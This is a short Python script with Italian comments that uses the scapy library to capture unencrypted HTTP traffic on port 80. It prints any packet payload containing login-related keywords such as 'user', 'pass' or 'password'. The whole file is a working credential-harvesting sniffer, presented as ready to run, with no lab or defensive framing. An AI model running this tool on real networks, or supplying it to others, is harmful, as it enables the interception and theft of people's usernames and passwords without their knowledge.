
from scapy.all import sniff, Raw

def process_http_packet(packet):
    """
    Questa funzione analizza i pacchetti HTTP per trovare dati di login.
    """
    # Controlliamo che il pacchetto abbia un payload (livello Raw)
    if packet.haslayer(Raw):
        try:
            # Decodifichiamo il payload da byte a stringa per poterlo leggere
            # 'errors="ignore"' previene errori se i dati non sono testo leggibile
            payload = packet[Raw].load.decode('utf-8', errors='ignore')

            # Parole chiave comuni da cercare nei dati di un form di login
            keywords = ['user', 'pass', 'pwd', 'log', 'username', 'password', 'credential']
            
            # Controlliamo se una delle parole chiave è presente nel payload
            if any(keyword in payload.lower() for keyword in keywords):
                print("---[ Pacchetto HTTP con possibili credenziali trovato! ]---")
                print(payload)
                print("-" * 60)

        except Exception as e:
            pass # Ignora eventuali errori di decodifica


print("Avvio sniffer per traffico HTTP (porta 80)... Premi CTRL+C per fermare.")
print("Cercando dati di login...")

try:
    # Filtriamo solo il traffico sulla porta 80 (standard per HTTP)
    sniff(filter="tcp port 80", prn=process_http_packet, store=0)

except KeyboardInterrupt:
    print("\nSniffer fermato.")
